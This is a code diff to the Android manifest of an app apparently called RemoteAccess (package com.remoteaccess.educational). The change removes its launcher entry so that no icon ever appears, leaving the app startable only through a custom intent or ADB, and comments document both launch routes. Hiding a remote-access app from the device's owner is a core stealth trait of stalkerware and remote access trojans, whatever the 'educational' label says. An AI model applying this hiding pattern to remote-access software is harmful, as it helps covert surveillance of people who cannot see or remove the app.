@@ -88,27 +88,31 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.RemoteAccess" >
 
-        <!-- Main Activity — singleTop prevents stacking multiple instances when notification is tapped -->
+        <!--
+            Main Activity — completely hidden from the app drawer / home screen.
+            No LAUNCHER intent filter means no icon is ever shown.
+
+            To launch from another app using ONLY the package name:
+              Intent i = new Intent("com.remoteaccess.educational.LAUNCH");
+              i.setPackage("com.remoteaccess.educational");   // ← package name only, no class
+              i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+              startActivity(i);
+
+            To launch via ADB:
+              adb shell am start -a com.remoteaccess.educational.LAUNCH \
+                -p com.remoteaccess.educational
+        -->
         <activity
             android:name="com.remoteaccess.educational.MainActivity"
             android:enabled="true"
             android:exported="true"
-            android:launchMode="singleTop" />
-        <!--
-            Launcher alias — disabled so the app does NOT appear in the app drawer.
-            The app can still be started directly via its package name or ADB.
-        -->
-        <activity-alias
-            android:name="com.remoteaccess.educational.LauncherAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:targetActivity="com.remoteaccess.educational.MainActivity" >
+            android:launchMode="singleTop" >
             <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
+                <action android:name="com.remoteaccess.educational.LAUNCH" />
 
-                <category android:name="android.intent.category.LAUNCHER" />
+                <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
-        </activity-alias>
+        </activity>
 
         <!-- Consent Activity -->
         <activity
